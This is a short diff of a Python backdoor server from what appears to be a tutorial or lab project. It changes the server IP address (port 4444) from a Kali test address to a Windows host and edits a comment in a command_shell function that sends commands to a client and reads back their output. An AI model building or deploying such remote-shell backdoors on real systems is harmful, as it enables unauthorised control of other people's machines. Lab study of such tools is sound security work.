@@ -34,8 +34,8 @@ arrAddresses = []  # Store All Socket Connection Addresses
 arrConnections = []  # Store All Connection Information about Socket Connections
 
 # TODO: for testing change SERVER_HOST to Kali WSL IP Address
-# SERVER_HOST = "192.168.10.100"  # Server IP Address
-SERVER_HOST = "172.29.132.195"  # Kali WSL IP Address, Server for testing
+SERVER_HOST = "192.168.10.100"  # Server IP Address - Main Windows as Server, VM-Win10 as Client
+# SERVER_HOST = "172.29.132.195"  # Kali WSL IP Address, Server for testing
 SERVER_PORT = 4444  # Server Port
 
 intBuff = 1024  # Maximum Size(Bytes) of Data to Receive as
@@ -326,7 +326,7 @@ def command_shell():
         elif len(str(strCommand)) > 0:
             send(str.encode(strCommand))
 
-            # Step 36: Complete `command_shell()` to Receive Stdout - Server Side
+            # Step 36: Complete `command_shell()` to Receive Stdout+stderr on the Backdoor Server
             # 3. Receive Command Output(stdout+stderr) from the Client
 
             # First Receive len of stdout+stderr
